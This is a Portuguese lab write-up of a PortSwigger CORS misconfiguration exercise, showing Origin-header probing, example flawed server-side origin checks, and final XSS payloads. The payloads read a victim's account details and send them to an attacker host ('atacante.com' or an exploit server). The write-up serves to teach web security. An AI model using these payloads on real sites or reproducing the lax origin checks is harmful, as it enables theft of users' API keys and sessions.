---
title: "CORS Series: Part 2"
categories:
  - writeups
  - web hacking
  - owasp
tags:
  - writeups
  - ctf
  - owasp
  - cors
---
## CORS Series: Confio em você, mais temos de ter um "grau de parentesco..."
Como assim? Talvez você pense ao ler o título. Vou te mostrar como, fique até o final!

Esse será o nosso último episódio dessa série e para fechar com chave de ouro trouxe um outro cenário divertido aqui para nós: CORS Misconfiguration **improper origin validation**. Calma que você já vai entender.

Caso queira acompanhar de forma prática, aqui está o [link](https://portswigger.net/web-security/cors/lab-breaking-https-attack) do lab da PortSwigger.
### CORS: Achando ele...
O processo de busca pelo CORS você já conhece, claro, se já leu os episódios anteriores, caso não, sugiro ler! Então, seguiremos em frente!

Primeiro de tudo precisamos buscar entender como o CORS está implementado no cenário em que estamos, isso é primordial.

Olhando as requests e sua resposta, vemos os cabeçalhos que já denunciam a existência de CORS:

```
GET /accountDetails HTTP/2
Host: 0a3500b503854aeb83fb4b0400d10082.web-security-academy.net
Cookie: session=sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3500b503854aeb83fb4b0400d10082.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Veja a resposta:
```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "HdO2QnBMxR0KLa5qcV6cPxx3ks1iHjGS",
  "sessions": [
    "sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe"
  ]
}
```

Como você sabe, esse camaradinha aqui: `Access-Control-Allow-Credentials: true` denuncia o CORS. Mas, pode ser que seja algo que foi posto ali para enganar atacantes, nunca se sabe, nunca confie 100%, teste!

E é isso que faremos, na request, vamos adicionar o header `Origin` e ver no que dá:
```
GET /accountDetails HTTP/2
Host: 0a3500b503854aeb83fb4b0400d10082.web-security-academy.net
Cookie: session=sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe
Sec-Ch-Ua-Platform: "Linux"
Origin: http://algumsite.com
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3500b503854aeb83fb4b0400d10082.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

Se você olhar a resposta, verá que não deu em nada.

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "HdO2QnBMxR0KLa5qcV6cPxx3ks1iHjGS",
  "sessions": [
    "sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe"
  ]
}
```

Te convido a testar com o `null` (lembra do episódio 2?) ali no lugar de `http://algumsite` para ver se dá em algo.

Mas, para te adiantar, também não dará em nada. Nessa hora, talvez você pense em desistir de testar CORS na aplicação, mas ainda não acabou o nosso estoque de possibilidades! É agora que entra o nosso última cenário dessa série!

A PortSwigger deu o nome para esse lab ou cenário, de: **CORS vulnerability with trusted insecure protocols**, mas podemos chamar de **CORS Misconfiguration (improper origin validation)**. Vou te mostrar com a prática o que seria esse nome ai, veja!

E se resolvêssemos colocar um subdomínio ali pra ver se dá em alguma coisa? Vamos testar:

```
GET /accountDetails HTTP/2
Host: 0a3500b503854aeb83fb4b0400d10082.web-security-academy.net
Cookie: session=sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe
Sec-Ch-Ua-Platform: "Linux"
Origin: http://sub.0a3500b503854aeb83fb4b0400d10082.web-security-academy.net
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3500b503854aeb83fb4b0400d10082.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

Agora olha a resposta:

```
HTTP/2 200 OK
Access-Control-Allow-Origin: http://sub.0a3500b503854aeb83fb4b0400d10082.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "HdO2QnBMxR0KLa5qcV6cPxx3ks1iHjGS",
  "sessions": [
    "sssRdjkWBtWDUrkpWXLVsQetaWRzGTYe"
  ]
}
```

Refletiu! Que doido, não acha? 
E sabe o que é pior, qualquer subdomínio que colocamos ali parece que vai refletir, ainda que não seja um subdomínio válido, que loucura!

É como se no backend tivesse assim:

```js
app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin && origin.includes('dominio.com')) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  next();
});
```

Mais uma vez, é apenas um exemplo, não sabemos se realmente, no nosso cenário aqui está assim. 

### CORS: E o perigo disso tudo?
Claro, isso é extremamente ruim! Mas o que torna bem pior isso tudo é a combinação disso tudo com o header `Access-Cotroll-Allow-Credentials: true`.

Antes de seguirmos com o cenário, precis te dizer que esse caso mereceria um pouco mais de análise, precisaríamos saber se está  ocorrendo uma checagem de *whitelist*, *blacklist* e por ai vai! Para só então tentarmos desenhar o ataque.

Vamos fazer um teste para esse cenário aqui e ver? Pode ser que  haja o seguinte código por trás (apenas um exemplo)

```
if (origin.endsWith("dominio.com")) {  
allow(origin)  
}
```

E no nosso cenário aqui é bem provável que haja um verificação desse tipo no backend, como já fizemos o teste anterior, não vou repeti-lo.

Agora, faremos o teste "reverso", a invés de colocar  subdomínio inexistente a frente, colocaremos o domínio alvo como subdomínio, exemplo: `0a3500b503854aeb83fb4b0400d10082.web-security-academy.net.atacante.com`

```
GET /accountDetails HTTP/2
Host: 0a7600d5031c97fe807249da00f10092.web-security-academy.net
Cookie: session=1WeJUQGY4SMxMX7SIVN5iVQemJYm6CON
Sec-Ch-Ua-Platform: "Linux"
Origin: http://0a7600d5031c97fe807249da00f10092.web-security-academy.net.atacante.com
Accept-Language: pt-BR,pt;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7600d5031c97fe807249da00f10092.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

A resposta:

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "email": "",
  "apikey": "6BNwrkrRs0pJVwfUKXMrDoez7U7cW8Gi",
  "sessions": [
    "1WeJUQGY4SMxMX7SIVN5iVQemJYm6CON",
    "VdSRkHTApcceCCRWI2llDjbYw5T1cuTr"
  ]
}
```

Perceba que não houve reflexão. 

Esse tipo de teste é importante porque vai ser ele quem vai guiar seu ataque.

Caso esse segundo cenário tivesse funcionado, a tática seria, como atacante, cadastrarmos o subdomínio `0a7600d5031c97fe807249da00f10092.web-security-academy.net.atacante.com` e então desenhar nosso ataque real direcionado a vítima para exfiltrar seus dados.

Mas, como esse não foi o caso, partiremos agora para o nosso cenário...
### CORS: precisaremos de auxílio....
O nosso caso aqui é um pouco diferente, não conseguimos registrar um subdomínio no domínio do alvo, certo, isso já sabemos.

Isso significa que precisaremos de um subdomínio do próprio alvo para fazer esse ataque funcionar.

O cenário que temos aqui é uma aplicação como as outas anteriores, porém, nesta temos uma feature de checagem de estoque. E essa feature está vulnerável a XSS, além de ficar em um subdomínio do domínio da própria aplicação, ou seja, justamente tudo que precisamos.

Como funcionará: Usaremos essa feature vulnerável, como ela está em um subdomínio, nos aproveitaremos disso para passar pelo CORS e executar o nosso payload JavaScript para exfiltrar os dados para o Exploit Server que fará o papel de infraestrutura do atacante.

Basicamente, o payload para explorarmos esse cenário seria:

```html
http://sub.vitima.com/?productId=4<script>  
fetch('https://vitima.com/accountDetails', {  
method: 'GET',  
credentials: 'include'  
})  
.then(r => r.text())  
.then(data => {  
location = 'https://atacante.com/log?key=' + encodeURIComponent(data);  
});  
<\/script>&storeId=1"  
```

Quando o XSS fosse acionado uma outra request seria feita para endpoint responsável por "cuspir" os dados e então ocorreria um redirect para o endpoint do atacante, enviando os dados via GET.

Mas é claro, como já vimos anteriormente, parece que somente os payloads fornecidos pela PortSwigger funcionam nos labs deles, portanto, não muda nada a teoria, apenas o payload:

```html
<script> document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

Como eu disse, o exploit server vai fazer o papel de infra do atacante e ainda vai acionar o payload, precisaríamos apenas trocar os valores ali correspondentes ao valores do lab e do exploit server, ai você consegue seguir com a solução e olhar nos logs do exploit server.

## No fim...
Esse caso foi um pouco mais dependente, visto que precisaríamos de alguma forma de nos aproveitar de uma requisição vinda de um subdomínio pertencente ao domínio da aplicação. Mas, me arrisco a dizer que no mundo real, esse será um dos cenários mais comuns de serem encontrados.

Enceerramos por aqui nossa série sobre CORS, pode ser que no futuro eu traga mais sobre CORS. Espero que esse conhecimento sirva de base para seus estudos e te ajude a entender um pouco mais sobre exploração de CORS Misconfiguration.

Muito obrigado!
Espero ter te ajudado em algo!
Até breve!

---
Para saber mais sobre
[CORS](https://portswigger.net/web-security/cors).
